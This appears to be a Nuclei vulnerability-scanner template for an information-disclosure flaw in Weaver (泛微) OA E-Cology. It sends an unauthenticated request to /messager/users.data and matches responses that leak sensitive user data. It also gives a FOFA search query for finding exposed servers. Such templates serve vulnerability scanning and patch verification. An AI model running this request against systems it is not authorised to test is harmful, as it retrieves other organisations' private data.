id: weaver-ecology-users-data-disclosure
info:
  name: 泛微 OA E-Cology users.data - disclosure
  author: leadlife
  severity: high
  description: 泛微 OA E-Cology users.data 允许任意用户下载，获取OA中的敏感信息
  reference: 
    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20users.data%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F.md
  metadata:
    verified: false
    fofa-query: app="泛微-协同商务系统"
  tags: weaver,disclosure,oa,ecology

http:
  - raw:
      - |
        GET /messager/users.data HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl 
        dsl:
          - status_code == 200
          - contains(body,'PHV')
        condition: and